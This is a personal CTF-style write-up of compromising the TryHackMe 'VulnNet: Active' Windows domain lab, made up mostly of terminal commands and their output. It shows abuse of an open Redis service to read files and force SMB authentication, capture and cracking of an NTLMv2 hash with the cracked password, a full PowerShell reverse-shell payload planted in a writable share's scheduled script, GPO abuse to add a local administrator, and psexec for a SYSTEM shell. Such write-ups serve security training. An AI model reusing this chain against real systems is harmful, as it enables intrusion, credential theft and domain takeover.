> export ip=`10.10.72.182`

# Date 24-04-24 || Rohit Tiwari

# Nmap scan 

```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182]
└─$ sudo nmap -sVC -v -A $ip -T4 -oN VulActive_nmap_scan

PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
464/tcp open  kpasswd5?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-24T13:35:03
|_  start_date: N/A

```

## Since network wasn't  completely boot up at the time time of nmap scan we miss some of the ports so here full port scan

```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182]
└─$ nmap -p- --min-rate 1000 $ip -Pn

Nmap scan report for 10.10.182.158
Host is up (0.19s latency).
Not shown: 65524 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
6379/tcp  open  redis
49665/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49694/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 197.26 seconds
```

## Let's ennumerate smb share first

>- Okay so used crackmapexec and found domain name and some cred

```bash

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182]
└─$ crackmapexec smb $ip -u 'guest' -p '' --rid-brute
SMB         10.10.72.182    445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
SMB         10.10.72.182    445    VULNNET-BC3TCK1  [-] vulnnet.local\guest: STATUS_ACCOUNT_DISABLED
```

## Found Port 6379 which is a redis port 

```python

What is Redis?

Redis is an open source in-memory data store that works really well as a cache or message broker, but it can also be used as a database when you don’t need all the features of a traditional database. It offers excellent performance, with the ability to quickly read and write data to memory. Additionally, Redis supports atomic operations, making it ideal for caching scenarios where you need fast access time.
```

>If u want to learn more about it read the article given https://backendless.com/redis-what-it-is-what-it-does-and-why-you-should-care/

# Connected to Redis-cli found some cred

```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182]
└─$ redis-cli -h 10.10.182.158 
10.10.182.158:6379> config get *
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
  6) ""
  7) "unixsocket"
  8) ""
  9) "logfile"
 10) ""
 11) "pidfile"
 12) "/var/run/redis.pid"
 13) "maxmemory"
 14) "0"
 15) "maxmemory-samples"
 16) "3"
 17) "timeout"
 18) "0"
 19) "tcp-keepalive"
 20) "0"
 21) "auto-aof-rewrite-percentage"
 22) "100"
 23) "auto-aof-rewrite-min-size"
 24) "67108864"
 25) "hash-max-ziplist-entries"
 26) "512"
 27) "hash-max-ziplist-value"
 28) "64"
 29) "list-max-ziplist-entries"
 30) "512"
 31) "list-max-ziplist-value"
 32) "64"
 33) "set-max-intset-entries"
 34) "512"
 35) "zset-max-ziplist-entries"
 36) "128"
 37) "zset-max-ziplist-value"
 38) "64"
 39) "hll-sparse-max-bytes"
 40) "3000"
 41) "lua-time-limit"
 42) "5000"
 43) "slowlog-log-slower-than"
 44) "10000"
 45) "latency-monitor-threshold"
 46) "0"
 47) "slowlog-max-len"
 48) "128"
 49) "port"
 50) "6379"
 51) "tcp-backlog"
 52) "511"
 53) "databases"
 54) "16"
 55) "repl-ping-slave-period"
 56) "10"
 57) "repl-timeout"
 58) "60"
 59) "repl-backlog-size"
 60) "1048576"
 61) "repl-backlog-ttl"
 62) "3600"
 63) "maxclients"
 64) "10000"
 65) "watchdog-period"
 66) "0"
 67) "slave-priority"
 68) "100"
 69) "min-slaves-to-write"
 70) "0"
 71) "min-slaves-max-lag"
 72) "10"
 73) "hz"
 74) "10"
 75) "repl-diskless-sync-delay"
 76) "5"
 77) "no-appendfsync-on-rewrite"
 78) "no"
 79) "slave-serve-stale-data"
 80) "yes"
 81) "slave-read-only"
 82) "yes"
 83) "stop-writes-on-bgsave-error"
 84) "yes"
 85) "daemonize"
 86) "no"
 87) "rdbcompression"
 88) "yes"
 89) "rdbchecksum"
 90) "yes"
 91) "activerehashing"
 92) "yes"
 93) "repl-disable-tcp-nodelay"
 94) "no"
 95) "repl-diskless-sync"
 96) "no"
 97) "aof-rewrite-incremental-fsync"
 98) "yes"
 99) "aof-load-truncated"
100) "yes"
101) "appendonly"
102) "no"
103) "dir"
104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
105) "maxmemory-policy"
106) "volatile-lru"
107) "appendfsync"
108) "everysec"
109) "save"
110) "jd 3600 jd 300 jd 60"
111) "loglevel"
112) "notice"
113) "client-output-buffer-limit"
114) "normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60"
115) "unixsocketperm"
116) "0"
117) "slaveof"
118) ""
119) "notify-keyspace-events"
120) ""
121) "bind"
```

>-At index 104 found `C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402` which leaks the username `enterprise-security` so looked on web foound some enumeration techniques

```bash

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182]
└─$ redis-cli -h $ip eval "dofile('C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402')"
(error) ERR wrong number of arguments for 'eval' command
                                                                                                             
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182]
└─$ redis-cli -h $ip eval "dofile('C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402')" 0
(error) ERR Error running script (call to f_08f15c13e701b8aed3abc0cbd0385d3db8a76d38): @user_script:1: cannot open C:Usersenterprise-securityDownloadsRedis-x64-2.8.2402: No such file or directory 
                                                                                                             
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182]
└─$ redis-cli -h $ip eval "dofile('C:\\Users\\enterprise-security\\Desktop\\')" 0                    
(error) ERR Error compiling script (new function): user_script:1: unfinished string near '<eof>' 
                                                                                                             
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182]
└─$ redis-cli -h $ip eval "dofile('C:\\Users\\enterprise-security\\Desktop\\user.txt')" 0
(error) ERR Error running script (call to f_e1024ba6b1cf739bebaae913edc392dfdb771779): @user_script:1: cannot open C:Usersenterprise-securityDesktopuser.txt: No such file or directory 
                                                                                                             
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182]
└─$ redis-cli -h $ip eval "dofile('C:\\Users\\enterprise-security\\Desktop\\\user.txt')" 0
(error) ERR Error running script (call to f_bfce33f3ad716e58903a82cefc6e8147424a2913): @user_script:1: cannot open C:Usersenterprise-securityDesktop\user.txt: No such file or directory 
                                                                                                             
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182]
└─$ redis-cli -h $ip eval "dofile('C:\\\Users\\\enterprise-security\\\Desktop\\\user.txt')" 0
(error) ERR Error running script (call to f_ce5d85ea1418770097e56c1b605053114cc3ff2e): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e'
```

## Got user.txt

# Now let's try to levrage our access used responder from imacket to get NTLM hash of the user since we can execute  command on user using redis-cli

```bash

#Responder
┌──(dedrknex㉿kali)-[~/oscp/Tools/impacket/examples]
└─$ sudo responder -I tun0
[sudo] password for dedrknex: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.9.237.141]
    Responder IPv6             [fe80::d146:34b:872a:3f]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-RCEKSHA1WT9]
    Responder Domain Name      [SOGZ.LOCAL]
    Responder DCE-RPC Port     [45176]

[+] Listening for events...


#attack machine
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182]
└─$ redis-cli -h $ip eval "dofile('//10.9.237.141/hash')" 0
(error) ERR Error running script (call to f_bc0b6d77f9fced3450d8ac656cf5c9d38dfb6b2b): @user_script:1: cannot open //10.9.237.141/hash: Permission denied 
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182]


#Responder


[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.182.158
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:e13f1361d779f2b7:35DD8EE7DB461C7719DF49073BD8479A:010100000000000000AC5DF62A9EDA019AF6950507E7159F000000000200080053004F0047005A0001001E00570049004E002D005200430045004B00530048004100310057005400390004003400570049004E002D005200430045004B0053004800410031005700540039002E0053004F0047005A002E004C004F00430041004C000300140053004F0047005A002E004C004F00430041004C000500140053004F0047005A002E004C004F00430041004C000700080000AC5DF62A9EDA010600040002000000080030003000000000000000000000000030000009D18135092177B11F84E707965FBC1B906D9C02490FC8736CCA7A131000F55F0A001000000000000000000000000000000000000900220063006900660073002F00310030002E0039002E003200330037002E003100340031000000000000000000

```
![](attachments/Pasted%20image%2020240504140059.png)

## Cracked hash

```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182/redis-cli]
└─$ hashcat -m 5600 -a 0 nthash  /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 7 4800H with Radeon Graphics, 2172/4408 MB (1024 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 4 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ENTERPRISE-SECURITY::VULNNET:e13f1361d779f2b7:35dd8ee7db461c7719df49073bd8479a:010100000000000000ac5df62a9eda019af6950507e7159f000000000200080053004f0047005a0001001e00570049004e002d005200430045004b00530048004100310057005400390004003400570049004e002d005200430045004b0053004800410031005700540039002e0053004f0047005a002e004c004f00430041004c000300140053004f0047005a002e004c004f00430041004c000500140053004f0047005a002e004c004f00430041004c000700080000ac5df62a9eda010600040002000000080030003000000000000000000000000030000009d18135092177b11f84e707965fbc1b906d9c02490fc8736cca7a131000f55f0a001000000000000000000000000000000000000900220063006900660073002f00310030002e0039002e003200330037002e003100340031000000000000000000:sand_0873959498
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ENTERPRISE-SECURITY::VULNNET:e13f1361d779f2b7:35dd8...000000

```

# Used smbshare to get the shares listing

```bash

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182/redis-cli]
└─$ smbmap -H $ip -u 'enterprise-security' -p 'sand_0873959498'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.182.158:445	Name: 10.10.182.158       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Enterprise-Share                                  	READ, WRITE	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
[|] Authenticating......                                                      
```


Now let's get some user fro it

```bash

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182/redis-cli]
└─$ python3 lookupsid.py enterprise-security@$ip | grep SidTypeUser
Password:
500: VULNNET\Administrator (SidTypeUser)
501: VULNNET\Guest (SidTypeUser)
502: VULNNET\krbtgt (SidTypeUser)
1000: VULNNET\VULNNET-BC3TCK1$ (SidTypeUser)
1103: VULNNET\enterprise-security (SidTypeUser)
1104: VULNNET\jack-goldenhand (SidTypeUser)
1105: VULNNET\tony-skid (SidTypeUser)
```

save it to user.txt and user some script to  get user

```bash

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182/redis-cli]
└─$ awk -F'\' '{print $2}' us.txt  | awk -F'(' '{print $1}' > user.txt
                                                                                                                     
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182/redis-cli]
└─$ cat user.txt                       
Administrator 
Guest 
krbtgt 
VULNNET-BC3TCK1$ 
enterprise-security 
jack-goldenhand 
tony-skid 

```


on enumerating smbshare again the enterprise-share found got access

```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182/redis-cli]
└─$ smbclient   \\\\10.10.255.108\\Enterprise-Share -U enterprise-security
Password for [WORKGROUP\enterprise-security]:sand_0873959498
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Feb 24 04:15:41 2021
  ..                                  D        0  Wed Feb 24 04:15:41 2021
  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 06:03:18 2021

		9466623 blocks of size 4096. 870735 blocks available
smb: \> 

```

after that tested if we can put file in it

```bash

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182/redis-cli]
└─$ smbclient   \\\\10.10.255.108\\Enterprise-Share -U enterprise-security
Password for [WORKGROUP\enterprise-security]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Feb 24 04:15:41 2021
  ..                                  D        0  Wed Feb 24 04:15:41 2021
  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 06:03:18 2021

		9466623 blocks of size 4096. 870735 blocks available
smb: \> put hello.txt
hello.txt does not exist
smb: \> put hello.txt
putting file hello.txt as \hello.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \> ls
  .                                   D        0  Sat May  4 14:46:31 2024
  ..                                  D        0  Sat May  4 14:46:31 2024
  hello.txt                           A        0  Sat May  4 14:46:31 2024
  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 06:03:18 2021

		9466623 blocks of size 4096. 4933583 blocks available
smb: \> put PurgeIrrelevantData_1826.ps1
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (0.2 kb/s) (average 0.1 kb/s)
smb: \> ls
  .                                   D        0  Sat May  4 14:46:31 2024
  ..                                  D        0  Sat May  4 14:46:31 2024
  hello.txt                           A        0  Sat May  4 14:46:31 2024
  PurgeIrrelevantData_1826.ps1        A      503  Sat May  4 14:48:15 2024

		9466623 blocks of size 4096. 4931673 blocks available
smb: \> 

```

```bash

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182/redis-cli]
└─$ vi PurgeIrrelevantData_1826.ps1

$client = New-Object System.Net.Sockets.TCPClient("10.9.237.141",4321);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```

got shell

![](attachments/Pasted%20image%2020240504145214.png)

got shell `Note wait for  sometime to get the shell`

```bash

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182/redis-cli]
└─$ nc -lnvp 2929 
listening on [any] 2929 ...
connect to [10.9.237.141] from (UNKNOWN) [10.10.255.108] 49767
whoami
vulnnet\enterprise-security
PS C:\Users\enterprise-security\Downloads> ls


    Directory: C:\Users\enterprise-security\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/23/2021   2:29 PM                nssm-2.24-101-g897c7ad                                                
d-----        2/26/2021  12:14 PM                Redis-x64-2.8.2402                                                    
-a----        2/26/2021  10:37 AM            143 startup.bat                                                           


PS C:\Users\enterprise-security\Downloads> cd ../
PS C:\Users\enterprise-security> ls


    Directory: C:\Users\enterprise-security


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        2/23/2021   2:02 PM                3D Objects                                                            
d-r---        2/23/2021   2:02 PM                Contacts                                                              
d-r---        2/23/2021   8:23 PM                Desktop                                                               
d-r---        2/23/2021   2:02 PM                Documents                                                             
d-r---        2/26/2021  11:29 AM                Downloads                                                             
d-r---        2/23/2021   2:02 PM                Favorites                                                             
d-r---        2/23/2021   2:02 PM                Links                                                                 
d-r---        2/23/2021   2:02 PM                Music                                                                 
d-r---        2/23/2021   2:02 PM                Pictures                                                              
d-r---        2/23/2021   2:02 PM                Saved Games                                                           
d-r---        2/23/2021   2:02 PM                Searches                                                              
d-r---        2/23/2021   2:02 PM                Videos                                                                


PS C:\Users\enterprise-security> cd De	
PS C:\Users\enterprise-security> cd Desktop
PS C:\Users\enterprise-security\Desktop> ls


    Directory: C:\Users\enterprise-security\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        2/23/2021   8:24 PM             37 user.txt                                                              


PS C:\Users\enterprise-security\Desktop> file user.txt
PS C:\Users\enterprise-security\Desktop> cat user.txt
THM{3eb176aee96432d5b100bc93580b291e}

```


bloodhound
https://korbinian-spielvogel.de/posts/vulnnet-active-writeup/#enumeration-of-the-smb-server---round-2


## AFter that i tried to find the smbshare in machine found it and uploaded sharhound.ps1 on it 

```bash
PS C:\> ls


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/23/2021   2:45 PM                Enterprise-Share                                                      
d-----        2/22/2021  10:32 PM                PerfLogs                                                              
d-r---        2/22/2021  11:45 AM                Program Files                                                         
d-----        2/22/2021  11:46 AM                Program Files (x86)                                                   
d-r---        2/23/2021   2:02 PM                Users                                                                 
d-----        2/28/2021  12:16 PM                Windows                                                               


PS C:\> cd Enterprise-Share
PS C:\Enterprise-Share> ls


    Directory: C:\Enterprise-Share


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        5/17/2024   8:10 AM            503 PurgeIrrelevantData_1826.ps1 




##Attacker machine
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182/vulnet_privesc]
└─$ smbclient   \\\\10.10.15.168\\Enterprise-Share -U enterprise-security
Password for [WORKGROUP\enterprise-security]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Feb 24 04:15:41 2021
  ..                                  D        0  Wed Feb 24 04:15:41 2021
  PurgeIrrelevantData_1826.ps1        A      503  Fri May 17 20:40:22 2024

		9558271 blocks of size 4096. 5135652 blocks available
smb: \> put SharpHound.ps1
putting file SharpHound.ps1 as \SharpHound.ps1 (363.6 kb/s) (average 363.6 kb/s)
smb: \>
```

![](attachments/Pasted%20image%2020240517211527.png)
got SharpHound data

```bash

PS C:\Enterprise-Share> ls


    Directory: C:\Enterprise-Share


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        5/17/2024   9:49 PM           4403 PurgeIrrelevantData_1826.ps1                                          
-a----        5/17/2024   9:53 PM        1046528 SharpHound.exe                                                        


PS C:\Enterprise-Share> . .\SharpHound.exe
2024-05-17T21:56:49.0904006-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-05-17T21:57:01.7335753-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-05-17T21:57:03.4119792-07:00|INFORMATION|Initializing SharpHound at 9:57 PM on 5/17/2024
2024-05-17T21:57:24.4154047-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for vulnnet.local : VULNNET-BC3TCK1SHNQ.vulnnet.local
2024-05-17T21:57:27.0408872-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-05-17T21:57:57.9946083-07:00|INFORMATION|Beginning LDAP search for vulnnet.local
2024-05-17T21:58:02.7508399-07:00|INFORMATION|Producer has finished, closing LDAP channel
2024-05-17T21:58:03.0718697-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-05-17T21:58:33.9329839-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 31 MB RAM
2024-05-17T21:59:04.2388235-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 32 MB RAM
2024-05-17T21:59:39.3112790-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 33 MB RAM
2024-05-17T22:00:10.8745629-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 33 MB RAM
2024-05-17T22:00:43.5964505-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 34 MB RAM
2024-05-17T22:01:25.2126510-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2024-05-17T22:01:52.9487188-07:00|WARNING|[CommonLib LDAPUtils]Error getting forest, ENTDC sid is likely incorrect
2024-05-17T22:01:55.4983962-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
2024-05-17T22:02:16.8126933-07:00|INFORMATION|Consumers finished, closing output channel
2024-05-17T22:02:21.5913414-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2024-05-17T22:02:25.8156621-07:00|INFORMATION|Status: 52 objects finished (+52 0.1940299)/s -- Using 38 MB RAM
Closing writers
2024-05-17T22:02:32.4253792-07:00|INFORMATION|Status: 94 objects finished (+42 0.3430657)/s -- Using 37 MB RAM
2024-05-17T22:02:32.4253792-07:00|INFORMATION|Enumeration finished in 00:04:34.9882463
2024-05-17T22:02:39.1654026-07:00|INFORMATION|Saving cache with stats: 52 ID to type mappings.
 52 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-05-17T22:02:39.9501155-07:00|INFORMATION|SharpHound Enumeration Completed at 10:02 PM on 5/17/2024! Happy Graphing!
PS C:\Enterprise-Share>
```


After bloddhound found a genericwire access vuln 

```bash
PS C:\Enterprise-Share>  .\SharpGPOAbuse.exe --AddComputerTask --TaskName "babbadeckl_privesc" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"

[+] Domain = vulnnet.local
[+] Domain Controller = VULNNET-BC3TCK1SHNQ.vulnnet.local
[+] Distinguished Name = CN=Policies,CN=System,DC=vulnnet,DC=local
[+] GUID of "SECURITY-POL-VN" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] Creating file \\vulnnet.local\SysVol\vulnnet.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
PS C:\Enterprise-Share> PS C:\Enterprise-Share> gpupdate /force
Updating policy...



Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

After that use psexc to get shell through smbshare

```bash

──(dedrknex㉿kali)-[~/oscp/Tryhackme/VulnetActive_10.10.72.182/vulnet_privesc]
└─$ python3 psexec.py enterprise-security:sand_0873959498@10.10.114.138
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.114.138.....
[*] Found writable share ADMIN$
[*] Uploading file hvymQaHx.exe
[*] Opening SVCManager on 10.10.114.138.....
[*] Creating service oyGx on 10.10.114.138.....
[*] Starting service oyGx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1757]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd ../

C:\Windows> cd ../

C:\> dir
 Volume in drive C has no label.
 Volume Serial Number is AAC5-C2C2

 Directory of C:\

05/17/2024  10:28 PM    <DIR>          Enterprise-Share
02/22/2021  11:32 PM    <DIR>          PerfLogs
02/22/2021  12:45 PM    <DIR>          Program Files
02/22/2021  12:46 PM    <DIR>          Program Files (x86)
02/23/2021  03:02 PM    <DIR>          Users
05/17/2024  10:46 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  21,010,681,856 bytes free

C:\> cd Users	

C:\Users> dir
 Volume in drive C has no label.
 Volume Serial Number is AAC5-C2C2

 Directory of C:\Users

02/23/2021  03:02 PM    <DIR>          .
02/23/2021  03:02 PM    <DIR>          ..
05/17/2024  10:23 PM    <DIR>          Administrator
02/26/2021  01:09 PM    <DIR>          enterprise-security
02/22/2021  12:46 PM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  21,010,034,688 bytes free

C:\Users> cd Adminstrator
The system cannot find the path specified.

C:\Users> cd Administrator

C:\Users\Administrator> dir
 Volume in drive C has no label.
 Volume Serial Number is AAC5-C2C2

 Directory of C:\Users\Administrator

05/17/2024  10:23 PM    <DIR>          .
05/17/2024  10:23 PM    <DIR>          ..
02/22/2021  02:55 PM    <DIR>          3D Objects
02/22/2021  02:55 PM    <DIR>          Contacts
02/23/2021  09:27 PM    <DIR>          Desktop
02/22/2021  02:55 PM    <DIR>          Documents
02/22/2021  02:55 PM    <DIR>          Downloads
02/22/2021  02:55 PM    <DIR>          Favorites
02/22/2021  02:55 PM    <DIR>          Links
02/22/2021  02:55 PM    <DIR>          Music
02/22/2021  02:55 PM    <DIR>          Pictures
02/22/2021  02:55 PM    <DIR>          Saved Games
02/22/2021  02:55 PM    <DIR>          Searches
02/22/2021  02:55 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  21,010,034,688 bytes free

cC:\Users\Administrator> cd Desktop

'ccd' is not recognized as an internal or external command,
operable program or batch file.
C:\Users\Administrator> dir
 Volume in drive C has no label.
 Volume Serial Number is AAC5-C2C2

 Directory of C:\Users\Administrator

05/17/2024  10:23 PM    <DIR>          .
05/17/2024  10:23 PM    <DIR>          ..
02/22/2021  02:55 PM    <DIR>          3D Objects
02/22/2021  02:55 PM    <DIR>          Contacts
02/23/2021  09:27 PM    <DIR>          Desktop
02/22/2021  02:55 PM    <DIR>          Documents
02/22/2021  02:55 PM    <DIR>          Downloads
02/22/2021  02:55 PM    <DIR>          Favorites
